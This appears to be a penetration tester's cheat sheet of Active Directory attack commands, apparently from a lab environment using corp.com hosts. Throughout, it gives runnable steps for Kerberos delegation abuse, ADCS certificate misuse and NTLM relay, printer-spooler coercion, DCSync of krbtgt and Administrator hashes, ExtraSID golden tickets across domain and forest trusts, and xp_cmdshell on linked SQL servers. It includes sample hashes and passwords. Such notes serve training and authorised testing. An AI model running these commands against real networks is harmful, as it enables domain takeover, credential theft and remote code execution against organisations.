python3 printerbug.py -hashes <FILES01-HASH-from-secetsdump> corp.com/FILES01\$@dc01.corp.com attacker.corp.com

===constrained-delegation
#GET COMPUTER HASH
#Need hash, if only have cleartext, use rubeus to generate hash
Rubeus.exe hash /password:password

#Generate TGT 
.\Rubeus.exe asktgt /user:iissvc /domain:corp.com /rc4:<NTLM Hash> /nowrap

#Invoke s4u extension to access allowed service
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt

#Attempt to resuse ticket on another service (Only works if the SPN is compatible; KDC may reject it if it’s not allowed.)
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt

===constrained-delegation-impacket
impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9
export KRB5CCNAME=iissvc.ccache
impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
export KRB5CCNAME=administrator.ccache
nxc mssql sql01.corp.com --use-kcache -X 'whoami'

===constrained-delegation-nxc
nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H <machine-hash> --delegate Administrator --self

===rbcd (role-based-constrained-delegation)
#Assume compromise of authenticated user on domain
#Check MachineAccountQuota
Get-DomainObject -Identity corp -Properties ms-DS-MachineAccountQuota

#Add fake account
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778

#modify msDS-AllowedToActOnBehalfOfOtherIdentity (allow added SPN to impersonate any user on target)
impacket-rbcd -action write -delegate-to 'BACKUP01$' -delegate-from 'myComputer$' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778

#Impersonate administrator
impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
	No such file or directory error: `unset KRB5CCNAME`

===rbcd-nxc
nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator

===adcs-misconfigs
#Request for cert
.\Certify.exe request /ca:ca01.corp.com\corp-CA01-CA /template:CorpKerbAuth /altname:Dave
#Convert cert
openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
#Request TGT using cert
#Rubeus
.\Rubeus.exe asktgt /user:Dave /certificate:cert.pfx /password:lab /ptt

#gettgtpkinit
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 123 -dc-ip dc08.corp.com corp.com/dave lab.ccache
	#if seg fault -> venv, pip install minikerberos
	
===adcs-http-relay
#Enumerate DC
certipy find -u 'user@corp.com' -p lab -dc-ip 192.168.124.60 -enabled // must use ip here //
#Verify vulnerability to relay attacks
cat *._Certipy.txt
cat *._Certipy.txt | grep 'Web Enrollment'

#Start ntlm relay listener; point to CA; cert will be captured here
impacket-ntlmrelayx -t http://ca01/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

#coerce dc into authenticating with CA
coercer coerce --target-ip 192.168.124.60 --l $LHOST -u user -p pass --filter-method-name EfsRpcAddUsersToFile

#Get hash of user
certipy auth -pfx DC01$.pfx -dc-ip 192.168.124.60  // must use ip here //

===AD Forest===
===Enumerate trusted domains
nltest /trusted_domains

([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

#Powerview
Get-DomainTrust -API
Get-DomainUser -Domain corp1.com

===ExtraSID (With child krbtgt hash + ExtraSID injection, any child DA → full Enterprise Admin (forest compromise))
[Must already be DA in child]
#Dump trusted account hash
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:corp1$

1# Force cross-domain authentication & check tickets  
dir \\rdc01.corp1.com\c$  
klist  

2# Dump the krbtgt hash from the child domain (for ticket forgery)
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt

3# Enumerate Domain SIDs  
Get-DomainSID -Domain prod.corp1.com  
Get-DomainSID -Domain corp1.com  

4# Forge Golden Ticket with ExtraSID (Might fail if SID filtering is enforced on the trust)
mimikatz # kerberos::golden /user:h4x /domain:prod.corp1.com /sid:<corp1_SID> /krbtgt:<hash> /sids:<corp2_SID>-519 /ptt

5# Abuse golden ticket
PsExec.exe \\rdc01 cmd

===Printers (Unconstrained Delegation)
1# Check access to print spooler on root DC
   ls \\rdc01\pipe\spoolss
   -> confirms print spooler accessible from child domain

2# Monitor for TGTs with Rubeus
   Rubeus.exe monitor /interval:5 /filteruser:RDC01$ /nowrap
   -> watches for DC’s machine account tickets

3# Coerce authentication from spooler
   SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
   -> forces root DC to authenticate to attacker-controlled system
   # Alternative coercion if spooler is disabled
   PetitPotam.exe rdc01.corp1.com appsrv01.prod.corp1.com

4# Capture & inject TGT
   Rubeus.exe ptt /ticket:<captured_ticket>
   -> loads root DC machine account TGT into memory

5# Abuse DC replication rights
   mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\administrator
   -> dump NTLM hash of root domain Administrator (Enterprise Admins)


===Golden tickets across forest trusts
1# Force cross-domain authentication & check tickets  
dir \\rdc01.corp1.com\c$  
klist  

1# Dump the krbtgt hash for current forest
mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt

2# Enumerate Domain SIDs for source & target forests
Get-DomainSID -Domain corp1.com 
Get-DomainSID -Domain corp2.com  

3# Forge Golden Ticket with ExtraSID 
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:<corp1_SID> /krbtgt:<hash> /sids:<corp2_SID>-519 /ptt

4# Access target forest
PsExec.exe \\dc01.corp2.com cmd ---> If it fails cause of SID filtering, need to enable SID history on trust

===Enable SID history
1# Check current trust attribs
Get-DomainTrust -Domain corp2.com

2# Enable SID history
netdom trust corp2.com /d:corp1.com /enablesidhistory:yes /quarantine:no

3# Find powerGroup (RID1106); bypasses RID < 1000 filtering
Get-DomainGroupMember -Identity 'Administrators' -Domain corp2.com

4# Craft golden ticket with custom group
mimikatz # kerberos::golden /user:h4x /domain:corp1.com /sid:<corp1 SID> /krbtgt:<hash> /sids:<corp2 SID-1106> /ptt

5# Access target forest
PsExec.exe \\dc01.corp2.com cmd

===Linked SQL Servers across Forest Trusts
#Enumerate SQL SPNs in local domain, parent domain, and trusted forest.
setspn -T prod -Q MSSQLSvc/*
setspn -T corp1 -Q MSSQLSvc/*
setspn -T corp2.com -Q MSSQLSvc/*

# Attempt auth to SQL Servers (custom c# code)

try on rdc01.corp1.com and remote forest (dc01.corp2.com) to prove auth flows across trusts
String sqlServer = 'rdc01.corp1.com';
SqlConnection con = new SqlConnection('Server=' + sqlServer + '; Database=master; Integrated Security=True;');

# Enumerate linked SQL server
EXEC sp_linkedservers;
-- Quick proof of code execution across linked servers
EXEC ('xp_cmdshell 'whoami'') AT [linkedserver]
